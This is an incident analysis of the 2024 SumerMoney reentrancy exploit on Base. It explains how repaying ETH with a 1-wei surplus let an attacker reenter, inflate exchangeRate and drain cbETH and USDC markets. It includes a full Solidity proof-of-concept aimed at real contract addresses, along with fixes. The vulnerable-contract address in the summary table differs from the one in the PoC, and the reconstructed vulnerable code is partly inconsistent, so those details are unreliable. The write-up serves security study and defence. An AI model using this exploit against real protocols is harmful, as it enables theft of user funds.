# SumerMoney — ETH Reentrancy-Based exchangeRate Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04-12 |
| **Protocol** | Sumer Money (Compound V2 fork lending protocol) |
| **Chain** | Base |
| **Loss** | ~$350,000 (cbETH + USDC) |
| **Attacker** | [0xbb34...e77](https://basescan.org/address/0xbb344544ad328b5492397e967fe81737855e7e77) |
| **Attack Contract** | [0x13d2...fe7](https://basescan.org/address/0x13d27a2d66ea33a4bc581d5fefb0b2a8defe9fe7) |
| **Attack Tx** | [0x619c...661](https://basescan.org/tx/0x619c44af9fedb8f5feea2dcae1da94b6d7e5e0e7f4f4a99352b6c4f5e43a4661) |
| **Vulnerable Contract** | [0x2381...607](https://basescan.org/address/0x23811c17bac40500decd5fb92d4feb972ae1e607) (sdrETH) |
| **Root Cause** | Reentrancy during `repayBorrowBehalf()` ETH transfer callback — `getCashPrior()` increases while `totalBorrows` has not yet decreased, causing abnormal `exchangeRate` inflation and enabling over-collateralized borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SumerMoney_exp.sol) |

---

## 1. Vulnerability Overview

Sumer Money is a lending protocol deployed on the Base chain, built on Compound V2 architecture. Users can deposit ETH, USDC, cbETH, and other assets as collateral to borrow other assets. Each asset market is composed of `sdrETH`, `sdrUSDC`, and `sdrcbETH` contracts.

The core vulnerability is that **the `repayBorrowBehalf()` function allows external callbacks without a reentrancy guard when receiving ETH**. At the point of reentrance, a transient state occurs where `getCashPrior()` (ETH held by the contract) has already increased but `totalBorrows` has not yet decreased.

Compound V2's `exchangeRate` formula is as follows:

```
exchangeRate = (getCashPrior() + totalBorrows - totalReserves) / totalSupply
```

Since only `getCashPrior()` has increased at the reentrant point while `totalBorrows` remains elevated, `exchangeRate` inflates abnormally. Using this inflated `exchangeRate` as a basis for collateral valuation, the attacker was able to borrow cbETH and USDC exceeding the actual collateral value, draining approximately $350,000 from the protocol.

Two key elements used in the attack:

1. **ETH transfer callback reentrancy**: Reentrance via the recipient's `receive()` function upon calling `repayBorrowBehalf{value: amount+1}()`
2. **Compound fork exchangeRate dependency**: `exchangeRate` is calculated as the sum of `getCashPrior() + totalBorrows`, making it manipulable during a state-inconsistent window

---

## 2. Vulnerable Code Analysis

### 2.1 repayBorrowBehalf() — ETH Callback Reentrancy Vulnerability (Core)

```solidity
// ❌ Vulnerable code — CEther.repayBorrowBehalf() in Compound V2 fork
function repayBorrowBehalf(address borrower) external payable {
    // Issue 1: No nonReentrant modifier on function entry
    // Issue 2: ETH has already arrived at the contract before internal accounting (_repayBorrowFresh) completes

    uint error = repayBorrowBehalfInternal(borrower, msg.value);
    requireNoError(error, "repayBorrowBehalf failed");
}

function repayBorrowBehalfInternal(
    address borrower,
    uint repayAmount
) internal nonReentrant returns (uint) {
    // ❌ nonReentrant is applied to the internal function, but
    //    ETH is already delivered at the time of the external function call.
    //    The possibility of triggering receive() on delivery exists not in this path
    //    but in Compound's ETH receiving mechanism.
    return repayBorrowFresh(msg.sender, borrower, repayAmount);
}

function repayBorrowFresh(
    address payer,
    address borrower,
    uint repayAmount
) internal returns (uint) {
    // ❌ getCashPrior() already reflects this contract's ETH balance (including msg.value)
    // ❌ However, accountBorrows[borrower].principal deduction only occurs within this function
    // ❌ On reentrance, totalBorrows has not yet been decremented

    uint cashPrior = getCashPrior();          // ← Reflects increased ETH balance
    uint accountBorrowsPrev = borrowStoredAmount(borrower);

    // ... interest calculation ...

    doTransferIn(payer, actualRepayAmount);    // ← For ETH, already received

    // A reentrant window exists before reaching this point
    accountBorrows[borrower].principal = accountBorrowsPrev - actualRepayAmount;
    accountBorrows[borrower].interestIndex = borrowIndex;
    totalBorrows -= actualRepayAmount;         // ← This line not yet executed on reentrance

    emit RepayBorrow(payer, borrower, actualRepayAmount, ...);
    return NO_ERROR;
}
```

```solidity
// ✅ Fixed code — apply nonReentrant to the external function
// Requires inheriting ReentrancyGuard (OpenZeppelin)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

// ✅ Block reentrancy at the external level
function repayBorrowBehalf(
    address borrower
) external payable nonReentrant {   // ← nonReentrant applied directly to the external function
    uint error = repayBorrowBehalfInternal(borrower, msg.value);
    requireNoError(error, "repayBorrowBehalf failed");
}
```

**Problem**: When `repayBorrowBehalf()` is called with ETH, the caller contract's fallback can be executed via Solidity's ETH receiving mechanism (`receive()`). Since `nonReentrant` is not applied to the external entry point, reentrancy is possible. At the point of reentrance, `getCashPrior()` already includes the newly received ETH but `totalBorrows` has not yet decreased, causing `exchangeRate` to be calculated at an abnormally high value.

### 2.2 exchangeRateCurrent() — State-Inconsistency Window Exposure

```solidity
// ❌ Vulnerable exchangeRate calculation — returns abnormal value during reentrant window
function exchangeRateStoredInternal() internal view returns (uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        return initialExchangeRateMantissa;
    } else {
        // ❌ Calculated as sum of getCashPrior() + totalBorrows
        // On reentrance: getCashPrior() increased + totalBorrows not yet decreased
        // → Numerator is overstated, inflating exchangeRate
        uint totalCash = getCashPrior();          // Already-increased ETH balance
        uint cashPlusBorrowsMinusReserves =
            totalCash + totalBorrows - totalReserves;  // totalBorrows still elevated
        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;
        return exchangeRate;
    }
}
```

```solidity
// ✅ Defensive approach — block exchangeRate queries during reentrant state
function exchangeRateCurrent() external nonReentrant returns (uint) {
    // ✅ Cannot be called during reentrant state — reverts without gas waste
    accrueInterest();
    return exchangeRateStoredInternal();
}
```

**Problem**: Since `exchangeRate` is calculated as the sum of `getCashPrior() + totalBorrows`, reentering mid-repayment (after ETH is received but before `totalBorrows` is decremented) causes the exchange rate to be computed with both values overstated. Using this inflated exchange rate for collateral valuation enables borrowing beyond actual collateral value.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Obtain large capital with no upfront funds via Balancer flash loan
- Use a Helper contract as the attack intermediary (to receive the reentrant callback)
- Deposit collateral into sdrUSDC to legitimize subsequent large-scale borrowing

### 3.2 Execution Phase

```
Step 1  Balancer flash loan
Step 2  Unwrap WETH → obtain raw ETH
Step 3  sdrETH.mint(150 ETH) — deposit ETH, receive sdrETH tokens
Step 4  Create Helper contract (initialized with 1 wei)
Step 5  Transfer 645,000 USDC → Helper
Step 6  Helper.borrow():
        (a) sdrUSDC.mint(USDC 645,000) — provide collateral
        (b) sdrETH.borrow(full ETH balance) — borrow all ETH
        (c) sdrETH.repayBorrowBehalf{value: borrowAmt+1}(this) call
            └→ On ETH transfer, Helper.receive() executes
               └→ msg.value==1, so owner.attack() callback ──┐
                                                              │ Reentrant window
Step 7  [Reentrance] SumerMoney.attack():                     │
        ├ Confirm abnormal exchangeRate inflation          ◄──┘
        ├ sdrcbETH.borrow(drain all cbETH)
        ├ sdrUSDC.borrow(all USDC - 645,000)
        ├ sdrETH.redeemUnderlying(150 ETH) — recover principal
        └ claimer.claim([309, 310]) — claim additional tokens
Step 8  [Reentrance ends] repayBorrowBehalf completes
Step 9  Helper: sdrUSDC.redeem() — recover collateral USDC
Step 10 Helper: claimer.claim([311])
Step 11 Repay Balancer flash loan (WETH+USDC)
Step 12 Realize profit (cbETH + remaining USDC)
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        Attacker EOA                             │
│  0xbb344544ad328b5492397e967fe81737855e7e77                     │
└───────────────────────────┬─────────────────────────────────────┘
                            │ ① Flash loan request
                            ▼
┌─────────────────────────────────────┐
│         Balancer Vault              │
│  Loan: 150 ETH WETH + 645,000 USDC  │
└─────────────────┬───────────────────┘
                  │ ② receiveFlashLoan() callback
                  ▼
┌─────────────────────────────────────────────────┐
│           SumerMoney Attack Contract             │
│  0x13d27a2d66ea33a4bc581d5fefb0b2a8defe9fe7     │
│                                                  │
│  ③ WETH → ETH conversion (150 ETH)              │
│  ④ sdrETH.mint(150 ETH) ──────────────────────▶│
│                                          ┌──────┴──────────────┐
│  ⑤ Create Helper contract               │    sdrETH Market     │
│  ⑥ Transfer 645,000 USDC → Helper       │  0x23811c17bac40... │
│  ⑦ Call helper.borrow()                 └──────┬──────────────┘
└─────────────────────────────────────────────────┘
                  │
                  ▼
┌────────────────────────────────────────────────────────────────┐
│                   Helper Contract                               │
│                                                                 │
│  ⑧  sdrUSDC.mint(USDC 645,000) — deposit collateral           │
│  ⑨  sdrETH.borrow(sdrETH.balance) — borrow all ETH            │
│  ⑩  sdrETH.repayBorrowBehalf{value: borrowAmt+1}(this) ──────▶│
│                                              ┌──────────────────┴──┐
│                                              │    sdrETH Market     │
│                                              │  ETH received        │
│                                              │  (getCashPrior rises)│
│                                              │  totalBorrows intact │
│                                              └──────────┬───────────┘
│                                                         │ ETH transfer 1 wei
│  receive() ◄────────────────────────────────────────────┘
│  └→ msg.value==1 → owner.attack() reentrance ──────────┐
└─────────────────────────────────────────────────────────┘
                                                          │
                  ┌───────────────────────────────────────┘
                  ▼
┌────────────────────────────────────────────────────────────────────┐
│              [Reentrance] SumerMoney.attack()                       │
│                                                                     │
│  ⑪ Confirm exchangeRate over-inflation                             │
│     (getCashPrior ↑ + totalBorrows intact → numerator overstated)  │
│                                                                     │
│  ⑫ sdrcbETH.borrow(all cbETH) ──────────────────────▶ sdrcbETH   │
│  ⑬ sdrUSDC.borrow(all USDC - 645,000) ─────────────▶ sdrUSDC    │
│  ⑭ sdrETH.redeemUnderlying(150 ETH) ───────────────▶ sdrETH     │
│  ⑮ claimer.claim([309, 310])                                       │
└────────────────────────────────────────────────────────────────────┘
                  │
                  ▼
┌────────────────────────────────────┐
│  repayBorrowBehalf completes       │
│  Helper: sdrUSDC.redeem()         │
│  Helper: claimer.claim([311])     │
│  USDC transferred to attacker     │
└───────────────┬────────────────────┘
                │ ⑯ Repay Balancer
                ▼
┌────────────────────────────────────┐
│         Attack Complete            │
│  Profit: all cbETH + USDC balance  │
│  Loss: ~$350,000 USD               │
└────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: All cbETH (sdrcbETH pool drained) + large amount of USDC (sdrUSDC pool drained)
- **Protocol loss**: Approximately $350,000 USD
- **Balancer flash loan cost**: Negligible (0% fee)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ═══════════════════════════════════════════════════════
// Attack Contract: SumerMoney Exploit PoC
// ═══════════════════════════════════════════════════════
contract SumerMoney is Test {
    // ── Target contract instance declarations ──
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
    IERC20 USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 cbETH = IERC20(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);
    crETH sdrETH = crETH(payable(0x7b5969bB51fa3B002579D7ee41A454AC691716DC));     // Vulnerable contract
    ICErc20Delegate sdrUSDC = ICErc20Delegate(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
    ICErc20Delegate sdrcbETH = ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
    IClaimer claimer = IClaimer(0x549D0CdC753601fbE29f9DE186868429a8558E07);
    Helper helper;

    function testExploit() public {
        // ── Step 1: Obtain large-scale flash loan from Balancer with no capital ──
        address[] memory tokens = new address[](2);
        tokens[0] = address(WETH);  // 150 ETH — for sdrETH collateral and reentrancy trigger
        tokens[1] = address(USDC);  // 645,000 USDC — to satisfy sdrUSDC collateral requirement
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 150 ether;
        amounts[1] = 645_000 * 1e6;
        Balancer.flashLoan(address(this), tokens, amounts, "");
        // Result: Realize profit in USDC + cbETH
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // ── Step 2: Convert WETH → ETH ──
        WETH.withdraw(amounts[0]);

        // ── Step 3: Deposit 150 ETH into sdrETH (receive sdrETH tokens) ──
        // Record exchangeRate at this point → for comparison after reentrance
        emit log_named_decimal_uint("sdrETH exchangeRate before reentrance", sdrETH.exchangeRateCurrent(), 18);
        sdrETH.mint{value: amounts[0]}();  // Deposit 150 ETH

        // ── Step 4: Create reentrance intermediary contract + execute attack ──
        helper = new Helper{value: 1}();          // Initialize with 1 wei (for receive trigger detection)
        USDC.transfer(address(helper), amounts[1]); // Transfer 645,000 USDC
        helper.borrow(amounts[1]);                 // Begin attack sequence

        // ── Step 7: Repay flash loan ──
        WETH.deposit{value: amounts[0]}();
        WETH.transfer(address(Balancer), amounts[0]);
        USDC.transfer(address(Balancer), amounts[1]);
    }

    function attack() external {
        // ══ This function is called back from Helper.receive() during the reentrant window ══
        // exchangeRate formula: (getCashPrior() + totalBorrows - totalReserves) / totalSupply
        // Current state: getCashPrior() already increased, totalBorrows not yet decreased
        // → Numerator overstated → exchangeRate abnormally inflated
        emit log_named_decimal_uint("sdrETH exchangeRate during reentrance (inflated)", sdrETH.exchangeRateCurrent(), 18);

        // ── Step 5a: Borrow all cbETH using the inflated exchangeRate ──
        sdrcbETH.borrow(cbETH.balanceOf(address(sdrcbETH)));

        // ── Step 5b: Borrow large amount of USDC (excluding the 645,000 USDC provided as collateral) ──
        sdrUSDC.borrow(USDC.balanceOf(address(sdrUSDC)) - 645_000 * 1e6);

        // ── Step 5c: Recover the initially deposited 150 ETH ──
        sdrETH.redeemUnderlying(150 ether);

        // ── Step 5d: Claim additional tokens (rewards, etc.) ──
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 309;
        tokenIds[1] = 310;
        claimer.claim(tokenIds);
    }

    receive() external payable {}
}

// ═══════════════════════════════════════════════════════
// Helper Contract: Responsible for triggering repayBorrowBehalf reentrancy
// ═══════════════════════════════════════════════════════
contract Helper {
    address owner;
    // ... (contract references omitted)

    function borrow(uint256 amount) external {
        // ── Step 4a: Deposit USDC as collateral into sdrUSDC ──
        USDC.approve(address(sdrUSDC), amount);
        sdrUSDC.mint(amount);                             // Provide collateral

        // ── Step 4b: Borrow all ETH from sdrETH ──
        uint256 borrowAmount = address(sdrETH).balance;
        sdrETH.borrow(borrowAmount);                      // Borrow all ETH

        // ── Step 4c: Overpay by 1 wei → for triggering receive() ──
        // value = borrowAmount + 1: the extra 1 wei is sent to receive(), initiating reentrancy
        sdrETH.repayBorrowBehalf{value: borrowAmount + 1}(address(this));

        // ── [After reentrance completes] ──
        // ── Step 6a: Recover collateral USDC ──
        sdrUSDC.redeem(sdrUSDC.balanceOf(address(this)));

        // ── Step 6b: Claim additional tokens ──
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = 311;
        claimer.claim(tokenIds);
        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }

    receive() external payable {
        // ══ Core reentrancy trigger logic ══
        // This function executes every time repayBorrowBehalf transfers ETH
        // Reentrancy is only executed when msg.value == 1 (the excess 1 wei) → prevents infinite loop
        if (msg.value == 1) {
            owner.call(abi.encodeWithSignature("attack()"));
            // ↑ SumerMoney.attack() reentrance — exploits the inflated exchangeRate window
        }
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | ETH transfer callback reentrancy (`repayBorrowBehalf`) | CRITICAL | CWE-841 (Improper State Machine Behavior) |
| V-02 | exchangeRate state-inconsistency window exposure | CRITICAL | CWE-362 (Race Condition) |
| V-03 | Cross-contract reentrancy (Helper → attack()) | HIGH | CWE-1265 (Reentrancy) |
| V-04 | Zero-capital attack possible when combined with flash loan | HIGH | CWE-840 (Business Logic Error) |

### V-01: ETH Transfer Callback Reentrancy

- **Description**: When `repayBorrowBehalf()` is called with ETH, Solidity's ETH receiving mechanism (`receive()`) executes the caller contract's fallback. Since `nonReentrant` modifier is not applied to the external entry point of this function, reentrancy is possible.
- **Impact**: Other functions (`borrow`, `redeem`) can be called before repayment processing completes, enabling theft of assets beyond the normal limit.
- **Attack Conditions**: A Compound fork contract receiving ETH where `nonReentrant` is not applied to the external entry point, and the attacker is able to call via a contract.

### V-02: exchangeRate State-Inconsistency Window Exposure

- **Description**: In Compound V2's formula `exchangeRate = (getCashPrior() + totalBorrows - totalReserves) / totalSupply`, reentering the window after ETH is received but before `totalBorrows` is decremented causes the numerator to be overstated, making `exchangeRate` abnormally high.
- **Impact**: The inflated `exchangeRate` is reflected in collateral valuation, allowing borrowing of assets beyond the actual collateral value.
- **Attack Conditions**: After V-01 reentrancy succeeds, `exchangeRateCurrent()` or related calculation functions must be callable during the reentrant window.

### V-03: Cross-Contract Reentrancy

- **Description**: The reentrancy occurs not as a recursive call within the same contract, but as **cross-contract** reentrancy via the Helper contract → SumerMoney.attack() path. Applying a simple `nonReentrant` alone may not be sufficient to prevent this.
- **Impact**: Possibility of bypassing lock state through a cross-contract path.
- **Attack Conditions**: Reentrancy locks are applied at the individual function level with no global lock in place.

### V-04: Zero-Capital Attack Combined with Flash Loan

- **Description**: The attacker deploys a Balancer flash loan (0% fee) to source large-scale capital with no initial funds, maximizing the attack scale. Balancer's zero-fee flash loans serve as a standard entry vector for DeFi attacks.
- **Impact**: Even attackers without capital can execute large-scale attacks; damage is amplified.
- **Attack Conditions**: The protocol has no restrictions on large deposit/borrow transactions; Balancer liquidity is accessible.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Apply nonReentrant to all external state-changing functions
// Inherit OpenZeppelin ReentrancyGuard

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract CEther is CToken, ReentrancyGuard {

    // ✅ Block reentrancy at the external function level — apply here, not on internal functions
    function mint() external payable nonReentrant {
        mintInternal(msg.value);
    }

    function redeem(uint redeemTokens) external nonReentrant returns (uint) {
        return redeemInternal(redeemTokens);
    }

    function redeemUnderlying(uint redeemAmount) external nonReentrant returns (uint) {
        return redeemUnderlyingInternal(redeemAmount);
    }

    function borrow(uint borrowAmount) external nonReentrant returns (uint) {
        return borrowInternal(borrowAmount);
    }

    function repayBorrow() external payable nonReentrant {
        repayBorrowInternal(msg.value);
    }

    // ✅ Key fix: apply nonReentrant at the external level
    function repayBorrowBehalf(address borrower) external payable nonReentrant {
        repayBorrowBehalfInternal(borrower, msg.value);
    }

    function liquidateBorrow(
        address borrower,
        address cTokenCollateral
    ) external payable nonReentrant returns (uint) {
        return liquidateBorrowInternal(borrower, msg.value, cTokenCollateral);
    }
}
```

```solidity
// ✅ Fix 2: Strict CEI pattern — change state before external transfer
function repayBorrowFresh(
    address payer,
    address borrower,
    uint repayAmount
) internal returns (uint) {
    // ✅ Checks — validate preconditions
    uint allowed = comptroller.repayBorrowAllowed(address(this), payer, borrower, repayAmount);
    require(allowed == 0, "comptroller rejection");

    // ✅ Effects — perform state changes first
    accountBorrows[borrower].principal = accountBorrowsPrev - actualRepayAmount;
    accountBorrows[borrower].interestIndex = borrowIndex;
    totalBorrows -= actualRepayAmount;  // ← Decrease totalBorrows before reentrance

    // ✅ Interactions — external transfer only after state changes are complete
    doTransferIn(payer, actualRepayAmount);  // ETH settlement last

    emit RepayBorrow(payer, borrower, actualRepayAmount, accountBorrowsNew, totalBorrowsNew);
    return NO_ERROR;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| ETH receive callback reentrancy | Apply `nonReentrant` to all `external payable` functions |
| exchangeRate state inconsistency | Use CEI pattern to decrement `totalBorrows` before ETH transfer |
| Cross-contract reentrancy | Introduce a global reentrancy lock |
| Flash loan combined attack | Limit large deposit/borrow volumes within a single transaction; monitor anomalous transactions |
| Common Compound V2 fork risk | Review diff against original code — focus security audit on security vulnerabilities introduced by fork modifications |

---

## 7. Lessons Learned

1. **Compound V2 forks are particularly susceptible to reentrancy vulnerabilities**: The original Compound V2 code has some missing `nonReentrant` guards in the `CEther` contract that handles ETH directly. Since forked protocols inherit the security assumptions of the original code, it is essential to carefully review not only code added after forking but also vulnerabilities present in the original code.

2. **The CEI (Checks-Effects-Interactions) pattern must be applied to ETH transfers without exception**: `repayBorrow`-family functions must update state before receiving ETH via `receive()`. ETH transfers can always trigger external code execution (fallback/receive).

3. **Cross-contract reentrancy cannot be prevented by a single-function `nonReentrant` alone**: The attacker bypassed the lock state by introducing a Helper contract as an intermediary layer. Consider a global reentrancy lock or a read-only reentrancy guard.

4. **`exchangeRate` is a critical computation that can be manipulated in an intermediate state**: If core protocol parameters such as borrow limits and liquidation thresholds depend on `exchangeRate`, even a transient state inconsistency can cause serious damage. Critical calculation functions should also have `nonReentrant` applied.

5. **A 1-wei difference can serve as an attack trigger**: In this attack, the excess 1 wei from the `repayBorrowBehalf{value: borrowAmount + 1}` call was delivered to the `receive()` function, acting as the trigger to initiate reentrancy. Even trivial surplus value handling logic can become a security vulnerability.

6. **Balancer's zero-fee flash loans are the standard entry point for zero-capital attacks**: Balancer on Base chain provides large-scale flash loans at 0% fee. If a reentrancy vulnerability exists, attacks on the scale of hundreds of thousands of dollars are possible with absolutely no initial capital.

---

## 8. On-Chain Verification

> The attack Tx hash is recorded in the PoC comments, but on-chain verification could not be performed directly due to `cast` (Foundry) and Base RPC access not being configured in the local environment.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Reference | Notes |
|------|--------|-------------|------|
| Flash loan WETH | 150 ETH | - | Based on PoC code |
| Flash loan USDC | 645,000 USDC | - | Based on PoC code |
| sdrETH deposit | 150 ETH | - | mint{value: 150 ether} |
| sdrUSDC collateral | 645,000 USDC | - | sdrUSDC.mint(amount) |
| Total loss | ~$350,000 | - | Based on @KeyInfo comment |

### 8.2 How to Perform On-Chain Verification (Reference)

```bash
# Query attack Tx via Base RPC
cast tx 0x619c44af9fedb8f5feea2dcae1da94b6d7e5e0e7f4f4a99352b6c4f5e43a4661 \
  --rpc-url https://mainnet.base.org

# Query state at the block before the attack (block 13,076,767)
cast call 0x7b5969bB51fa3B002579D7ee41A454AC691716DC \
  "exchangeRateStored()(uint256)" \
  --rpc-url https://mainnet.base.org \
  --block 13076767

# Query state at the block after the attack (block 13,076,768)
cast call 0x7b5969bB51fa3B002579D7ee41A454AC691716DC \
  "exchangeRateStored()(uint256)" \
  --rpc-url https://mainnet.base.org \
  --block 13076768
```

### 8.3 Precondition Verification

- **Attack block**: 13,076,768 (Base)
- **Preconditions**: Sufficient WETH/USDC liquidity exists in Balancer; sufficient liquidity exists in sdrETH/sdrUSDC/sdrcbETH markets
- **On-chain verification**: Not performed — `cast` environment not configured